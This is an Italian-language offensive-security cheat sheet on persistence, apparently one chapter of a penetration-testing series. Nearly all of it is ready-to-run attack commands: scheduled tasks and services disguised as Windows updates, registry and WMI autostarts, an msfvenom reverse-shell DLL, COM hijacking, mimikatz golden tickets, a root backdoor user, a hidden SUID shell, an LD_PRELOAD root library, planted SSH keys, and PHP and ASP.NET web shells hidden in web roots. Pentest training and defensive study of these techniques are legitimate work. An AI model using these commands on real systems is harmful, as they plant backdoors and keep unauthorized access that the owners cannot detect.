# 🔒 Fase 5: Persistence

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**Obiettivo:** Mantenere l’accesso al sistema compromesso anche dopo riavvii o rilevamento.

---

## 🖥️ Persistence su Windows

### Scheduled Tasks
```cmd
# Crea task pianificato (eseguito come SYSTEM)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# Con utente specifico
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# All’avvio
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# Ogni ora
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# Lista task
schtasks /query /fo LIST /v

# Cancella task
schtasks /delete /tn "TaskName" /f
```

### Registry Run Keys
```cmd
# HKCU - Utente corrente (no admin)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM - Tutti gli utenti (richiede admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce (esegue una volta poi si cancella)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

### Startup Folder
```cmd
# Utente corrente
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Tutti gli utenti (richiede admin)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Services
```cmd
# Crea servizio (richiede admin)
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# Modifica servizio esistente
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

### WMI Event Subscriptions
```powershell
# Crea persistence WMI
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### DLL Hijacking / Search Order
```cmd
# Verifica opportunità di DLL hijack
# Inserisci DLL malevola nella directory dell’applicazione
# Target comuni:
# - Programmi che non specificano path completi delle DLL
# - DLL mancanti

# Crea DLL malevola
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### COM Hijacking
```powershell
# Trova oggetti COM
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# Crea hijack
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

### Golden/Silver Ticket
```powershell
# Golden ticket - admin di dominio persistente
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver ticket - accesso persistente a servizio
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

## 🐧 Persistence su Linux

### Cron Jobs
```bash
# Crontab utente
crontab -e
# Aggiungi: * * * * * /tmp/shell.sh

# Crontab di sistema
echo "* * * * * root /tmp/shell" >> /etc/crontab

# Cartelle cron
echo "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

### SSH Keys
```bash
# Aggiungi la tua chiave pubblica a authorized_keys
echo "ssh-rsa AAAA...your_key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Accesso root
echo "ssh-rsa AAAA...your_key..." >> /root/.ssh/authorized_keys
```

### Backdoor User
```bash
# Aggiungi utente con privilegi root
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# Oppure aggiungi direttamente a /etc/passwd
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

### SUID Binary
```bash
# Copia bash e imposta SUID
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# Esegui come root
/tmp/.hidden -p
```

### Systemd Service
```bash
# Crea file di servizio
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Abilita e avvia
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### bashrc / profile
```bash
# Aggiungi a bashrc utente
echo '/tmp/shell &' >> ~/.bashrc

# Aggiungi a profile globale
echo '/tmp/shell &' >> /etc/profile

# Aggiungi a bash_profile
echo '/tmp/shell &' >> ~/.bash_profile
```

### LD_PRELOAD
```bash
# Crea libreria condivisa malevola
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Aggiungi a LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

### Web Shell
```bash
# PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# Più nascosta
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

## 🌐 Persistence Web

### Posizioni Web Shell
```bash
# Posizioni comuni per web shell
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

### ASP.NET Web Shell
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

## 📊 Riferimento Rapido

### Metodi di Persistence Windows

| Metodo | Posizione | Privilegio |
|--------|-----------|------------|
| Registry Run | HKCU/HKLM | User/Admin |
| Scheduled Task | Task Scheduler | User/Admin |
| Startup Folder | AppData/ProgramData | User/Admin |
| Service | Services | Admin |
| WMI | WMI Subscription | Admin |
| COM Hijack | HKCU CLSID | User |

### Metodi di Persistence Linux

| Metodo | Posizione | Privilegio |
|--------|-----------|------------|
| Cron | /etc/crontab | root |
| SSH Keys | ~/.ssh/authorized_keys | User |
| SUID | Binary con +s | root |
| Systemd | /etc/systemd/system | root |
| bashrc | ~/.bashrc | User |

---

## 🔗 Cheatsheet Correlate

- [PowerShell](../PowerShell/translations/README.it.md)
- [Linux Commands](../Linux-Commands/translations/README.it.md)
- [Metasploit](../Metasploit/translations/README.it.md)

---

**Fase Precedente:** [← 04 - Lateral Movement](./04-Lateral-Movement.it.md)

**Fase Successiva:** [06 - Defense Evasion →](./06-Defense-Evasion.it.md)
